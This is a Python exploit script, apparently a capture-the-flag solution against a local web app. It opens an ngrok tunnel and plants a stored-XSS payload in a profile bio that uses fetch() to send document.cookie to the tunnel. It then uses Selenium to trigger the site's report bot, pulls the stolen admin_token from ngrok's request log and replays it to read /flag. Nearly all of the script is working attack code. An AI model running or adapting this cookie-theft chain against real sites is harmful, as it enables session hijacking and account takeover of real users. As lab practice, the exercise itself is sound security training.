#make post request to the server

from time import sleep, time
import requests
import os

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By


url="http://localhost:80"
s=requests.Session()
#use webdriver to get the cookie

#use driver from this folder
#driver = webdriver.Chrome(executable_path="./chromedriver")
#use driver from system
driver = webdriver.Chrome()


#open ngrok tunnel
os.system("killall ngrok")
os.popen("ngrok http 5556 &")
#make get request to localhost:4044/api/tunnels
#waait 3 seconds
#open http://127.0.0.1:4044  in browser new tab
sleep(3)

driver.get("http://127.0.0.1:4040")
r=requests.get("http://localhost:4040/api/tunnels")
#get public url
NGROKURL=r.json()["tunnels"][0]["public_url"]
print(NGROKURL)


#fetch /flag 


# xss get cookie and send it to the server
payload=f"""<input autofocus onfocus="fetch('{NGROKURL}/flag?cookie='+document.cookie);"/>"""

r=s.post(url+"/signup",data={
    "password":"admin",
    "email":"admin@gmail.com",
    "fullname":"admin",
    "bio":payload},headers={"Content-Type":"application/x-www-form-urlencoded"})

#print(r.text)
print(r.status_code)
print(r.url)


if("Email address already exists" in r.text):
    print("user already exists")
    r=s.post(url+"/login",data={
        "password":"admin",
        "email":"admin@gmail.com"},headers={"Content-Type":"application/x-www-form-urlencoded"})

    #edit profile

    #check if ok
    if(r.status_code==200):
        print("logged in now setting the payload")
        
        r=s.post(url+"/edit",data={
            "password":"admin",
            "email":"admin@gmail.com",
            "fullname":"admin",
            "bio":payload},headers={"Content-Type":"application/x-www-form-urlencoded"})


        #print(r.text)
        print(r.status_code)
        print(r.url)

#wait for input
#in new tab with key inputs

driver.execute_script("window.open('');")
driver.switch_to.window(driver.window_handles[1])
driver.get(url+"/profile")
driver.add_cookie({'name': 'session', 'value': s.cookies['session']})
driver.get(url+"/profile")


#make a request to the server with the cookie on /report
#wait for 2 seconds
#click report button
#wait

#click report button
#wait for page to load
WebDriverWait(driver, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')

driver.find_element(By.ID,'report_button').click()
sleep(1)
driver.switch_to.window(driver.window_handles[0])
#sleep 5
print("wait for 5 seconds")
sleep(5)

#http://localhost:4044/api/requests/http
r=requests.get("http://localhost:4040/api/requests/http",headers = {'Content-Type': 'application/json ;charset=utf-8'})

#find request with cookie
print(r.json()["requests"][0]["request"]['uri'])

cookie=""
#get requset query and find cookie
for i in r.json()["requests"]:
    if(len(i["request"]['uri'])>len("/flag?cookie=")):
        print(i["request"]['uri'])
        #get value of cookie
        cookie=i["request"]['uri'][len("/flag?cookie=admin_token="):]
        print(cookie)
        break



if(cookie!=""):
    #make get request to /flag with cookie in header
    r=s.get(url+"/flag",headers={"Cookie":f"admin_token={cookie}"})
    #
    print(r.text)
    print(r.status_code)
else:
    print("error")


#close driver
input("press enter to exit")

    




